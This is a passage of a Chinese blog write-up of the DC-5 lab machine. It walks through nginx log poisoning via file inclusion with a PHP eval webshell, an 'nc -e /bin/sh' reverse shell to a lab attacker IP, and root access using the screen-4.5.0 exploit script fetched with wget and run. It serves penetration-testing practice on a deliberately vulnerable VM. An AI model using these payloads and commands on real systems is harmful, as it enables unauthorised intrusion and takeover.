+<p>在错误日志中，我们可以发现，先前访问密码文件<code>/etc/shadow</code>引发的错误信息日志。可以看到，浏览器尝试打开文件<code>/etc/shadow</code>，但可能由于权限限制，文件打开失败。因此将该文件路径记录进错误日志中，记录服务器尝试打开文件但失败的信息。</p>
+<blockquote>
+<p>这里提供给我们一个思路：在将包含文件路径替换为一句话木马，目标服务器是否也会尝试去打开（执行）。</p>
+</blockquote>
+<p>至此，第三个访问配置文件就可以先不访问了。编写提权一句话木马，注入到文件包含路径处。</p>
+<h3 id="注入一句话木马"><a href="#注入一句话木马" class="headerlink" title="注入一句话木马"></a>注入一句话木马</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash《》">&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717194058442.png" srcset="/img/loading.gif" lazyload></p>
+<p>注意：需要将格式什么的一并写入的包含的路径处。</p>
+<p>对错误日志文件进行文件包含并再次进行抓包-重放-查看，如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717201101644.png" srcset="/img/loading.gif" lazyload alt="image-20240717201101644"></p>
+<p>可以发现，写入的一句话木马已经被成功记录在错误日志当中了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717193905317.png" srcset="/img/loading.gif" lazyload alt="image-20240717193905317"></p>
+<p>但是此时尝试连接的时候怎么都连接不上！！！！尝试了挺多方法的。最后通过请教糖糖，得出了结论：<code>是由于没有给注入的一句话木马加上双引号导致的写入失败</code>。</p>
+<blockquote>
+<p>之前在修改用户hash密码的部分也强调了需要给密码值添加双引号！，原因是让后台程序将其当作一个字符串处理而不是对其进行编码。我猜测这次的一句话木马注入同理，如果不给其添加双引号告诉后台将其当作一整个字符串处理的话，那么后台就会对其进行从左到右的识别，即编码，这可能会导致“木马不成木马”。从而致使反弹shell失败。</p>
+</blockquote>
+<p>所以，对一句话木马<code>添加双引号</code>后进行重新注入：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718100954941.png" srcset="/img/loading.gif" lazyload alt="image-20240718100954941"></p>
+<p>访问错误日志，对其进行抓包并重放，查看响应日志：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718101452541.png" srcset="/img/loading.gif" lazyload alt="image-20240718101452541"></p>
+<p>可以发现，错误日志中已经写入了一句话木马。</p>
+<p>接下来使用中国蚁剑新建连接，尝试让对方服务器执行我们注入的一句话木马，就是执行shell捏！。</p>
+<p>新建连接，然后写入包含错误日志的url，密码是shell，测试连接！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718113614750.png" srcset="/img/loading.gif" lazyload alt="image-20240718113614750"></p>
+<p>我测！还是提示”返回数据为空“！心理防线要崩溃了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/33G0((%40QI847LS61RX4)RHY.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>仔细查看糖糖昨晚给我发的添加双引号后抓包得到的截图，发现我们在抓取的一句话木马注入的数据包上有些许不同。那就是，我注入的一句话木马在抓取到的数据包中，其<code>&lt;&gt;&quot;&quot;&#39;&#39;</code>都被编码了，而糖糖的并没有被编码（经过询问，可能是我使用的burpsuite版本有点低？）。</p>
+<p>这不就是上面我所说的<code>被编码</code>问题了吗！我测！既然如此，你不仁便别怪我不义。</p>
+<p>将抓取到的数据包发送到重放器，直接对数据包进行修改，把被编码的部分都改回来！！！然后重放该数据包，得到如下响应：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718114303124.png" srcset="/img/loading.gif" lazyload alt="image-20240718114303124"></p>
+<p>这时候我们再对中国蚁剑进行连接测试。我测！连接成功了！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718113449128.png" srcset="/img/loading.gif" lazyload alt="image-20240718113449128"></p>
+<p>尝试打开虚拟终端，我测！终于成功了！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718114818442.png" srcset="/img/loading.gif" lazyload alt="image-20240718114818442"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718114845899.png" srcset="/img/loading.gif" lazyload alt="image-20240718114845899"></p>
+<p>码垛，好激动！！！！！！！啊啊啊啊！！！血的记忆！！！！！</p>
+<p>接下来就是要启动交互界面了，因为在虚拟终端中不能复制粘贴，啥命令都得自己打。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718161048835.png" srcset="/img/loading.gif" lazyload alt="image-20240718161048835"></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>上面已经成功地注入一句话木马并让对方服务器执行了shell了。现在我们需要在自己的本地终端”远程登陆“对方的用户账户，然后执行更进一步的操作。</p>
+<p>结合之前的经验，我们可以通过注入脚本代码，让对方执行，并在我们本地终端监听端口，等待反弹shell。</p>
+<p>同样是利用文件包含漏洞来实现这个脚本注入：</p>
+<p>我们前面已经将一句话木马<code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code>写入了错误日志文件中。</p>
+<p>现在我们想让对方不单执行<code>shell</code>，还要赋予我们权限（攻击方）为我们开启端口监听服务。因此我们可以将注入内部的<code>shell</code>使用<code>&amp;</code>符号进行重新更新。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -e /bin/sh 192.168.204.128 9999<br></code></pre></td></tr></table></figure>
+
+<p><code>nc</code>使用nc（netcat）工具建立一个反弹shell连接</p>
+<p><code>-e /bin/sh</code>指定连接建立后执行的程序，<code>/bin/sh</code>是指向系统默认的shell程序，用于执行命令行指令和脚本。</p>
+<p>后面两个分别指明了攻击者的IP地址，以及攻击者设定的监听端口。</p>
+<p>在网页连接中访问如下链接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.204.134/thankyou.php?file=/var/log/nginx/error.log&amp;shell=nc -e /bin/sh 192.168.204.128 9999<br></code></pre></td></tr></table></figure>
+
+<p>然后在中国蚁剑测试链接并打开虚拟终端。</p>
+<p>为了防止错过端口监听，可以现在本地终端开启监听！</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 9999<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718162910445.png" srcset="/img/loading.gif" lazyload alt="image-20240718162910445"></p>
+<p>在网页访问包含错误日志的新的链接，然后在中国蚁剑尝试连接，成功。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718163019550.png" srcset="/img/loading.gif" lazyload alt="image-20240718163019550"></p>
+<p>双击点进去，看到其文件目录，发现我们已经能够访问之前没有权限访问的CSS目录了，里面是一个”system.css“文件，可以查看具体代码：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718163405746.png" srcset="/img/loading.gif" lazyload alt="image-20240718163405746"></p>
+<p>打开虚拟终端，在其中输入我们重定义的<code>shell值</code>：<code>nc -e /bin/sh 192.168.204.128 9999</code>，回车：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718163540220.png" srcset="/img/loading.gif" lazyload alt="image-20240718163540220"></p>
+<p>查看本地终端，发现已经连上了目标靶机：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718163732517.png" srcset="/img/loading.gif" lazyload alt="image-20240718163732517"></p>
+<p>启动交互界面：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718164219986.png" srcset="/img/loading.gif" lazyload alt="image-20240718164219986"></p>
+<p>接下来就是要查找其具有SUID权限的命令，尝试进行提权。当然也可以先查找一下当前用户账户下是否存在flag文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure>
+
+<p>但是我们发现重要文件被拒绝访问了捏！所以我们得先提权！！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718175801209.png" srcset="/img/loading.gif" lazyload alt="image-20240718175801209"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ul>
+<li><strong>查看具有SUID权限的命令</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<p>得到如下结果：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718184000866.png" srcset="/img/loading.gif" lazyload alt="image-20240718184000866"></p>
+<p>可用于提权的命令有：<code>mount</code>、<code>screen-4.5.0</code>、<code>exim4</code></p>
+<p>根据之前的经验，可以有效进行提权的指令为<code>exim4</code>，但是相对复杂，需要逐个进行测试，唉，也不算咋复杂吧，有脚本的话会方便一点。</p>
+<p>先从比较熟悉的命令开始尝试提权吧。</p>
+<h3 id="mount提权"><a href="#mount提权" class="headerlink" title="mount提权"></a><strong>mount提权</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount --o <span class="hljs-built_in">bind</span> /bin/bash /usr/bin/mount<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718184943024.png" srcset="/img/loading.gif" lazyload alt="image-20240718184943024"></p>
+<p>提示只有root权限用户才可以使用这个命令。</p>
+<h3 id="exim4提权"><a href="#exim4提权" class="headerlink" title="exim4提权"></a><strong>exim4提权</strong></h3><p>查看使用版本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exim4 --version<br></code></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718185200089.png" srcset="/img/loading.gif" lazyload alt="image-20240718185200089" style="zoom:150%;" />
+
+<p>版本为：<code> 4.84_2</code></p>
+<p>使用<code>searchsploit</code>查找该exim4版本的可利用代码文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit exim 4<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718185651405.png" srcset="/img/loading.gif" lazyload alt="image-20240718185651405"></p>
+<p>只找到了一个4.84版本的漏洞利用文件，但是它是<code>4.84-3</code>，靶机使用的是<code>4.84_2</code>的。所以相当于，没有对于4.84_2版本的exim4漏洞利用文件。</p>
+<p>使用exim4提权行不通咯！</p>
+<h3 id="screen-4-5-0提权"><a href="#screen-4-5-0提权" class="headerlink" title="screen-4.5.0提权"></a><strong>screen-4.5.0提权</strong></h3><p><a target="_blank" rel="noopener" href="https://beret81.gitbook.io/pte/quan-xian-ti-sheng/linux-ti-quan/suid-ti-quan/suid-ti-quan-screen4.5.0">SUID 提权– screen-4.5.0</a></p>
+<p>同样也是先查找是否有关于其的漏洞利用文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit screen 4.5.0<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718185941675.png" srcset="/img/loading.gif" lazyload alt="image-20240718185941675"></p>
+<p>发现了一个脚本文件和一个txt文本文件。</p>
+<blockquote>
+<p>linux&#x2F;local&#x2F;41154.sh</p>
+<p>linux&#x2F;local&#x2F;41152.txt</p>
+</blockquote>
+<p>首选，当然是利用脚本文件！</p>
+<p><strong>先下载该脚本文件到当前目录下：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -m 41154.sh<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718190652559.png" srcset="/img/loading.gif" lazyload alt="image-20240718190652559"></p>
+<p>然后，在本地终端（kali）启动apache2服务，将该脚本文件移动到<code>/var/www/html</code>文件夹下，相当于将文件放到网页上嘛。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">service apache2 start<br><span class="hljs-built_in">mv</span> 41154.sh /var/www/html<br>service apache2 status<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718191251542.png" srcset="/img/loading.gif" lazyload alt="image-20240718191251542"></p>
+<p>然后，在目标靶机终端，进入<code>/tmp</code>目录下，使用<code>wget</code>命令下载该脚本文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://192.168.204.128/41154.sh<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718191456356.png" srcset="/img/loading.gif" lazyload alt="image-20240718191456356"></p>
+<p>然后给与该脚本文件执行的权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x 41154.sh<br>./41154.sh<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718191748797.png" srcset="/img/loading.gif" lazyload alt="image-20240718191748797"></p>
+<p>ok！成功提权！</p>
+<p>接下来就是查找flag文件了！</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718191857286.png" srcset="/img/loading.gif" lazyload alt="image-20240718191857286"></p>
+<p>cat该txt文件！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718191931227.png" srcset="/img/loading.gif" lazyload alt="image-20240718191931227"></p>
+<p>大功告成。结束。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>攻打这个靶场运用到了<code>文件包含漏洞</code>的利用知识。还有中国蚁剑对于<code>反弹shell</code>的操作手法。</p>
+<ul>
+<li><p>文件包含漏洞：包含手法、测试方法、利用方法（在包含处注入一句话木马等）注意！非路径的注入都必须使用双引号收敛。否则有很大的可能会包含失败。</p>
+</li>
+<li><p>利用到了nginx的特点：nginx会将执行的命令记录下来并写入日志文件中。本文中使用中国蚁剑对nginx的错误日志进行连接的时候，会触发其执行包含注入的php代码（譬如一句话木马等）</p>
+</li>
+<li><p>目录爆破跟字典有关系，有些时候没爆破出东西，可能是字典不够大，换个工具或者换个字典都行。</p>
+</li>
+<li><p>新学到一个screen提权。</p>
+</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>DC-5</div>
+      <div>https://haoisbinlove.github.io/2024/07/30/DC-5/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Sweety</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年7月30日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/07/30/DC-6/" title="DC-6">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">DC-6</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/24/DC-4/" title="DC-4">
+                        <span class="hidden-mobile">DC-4</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
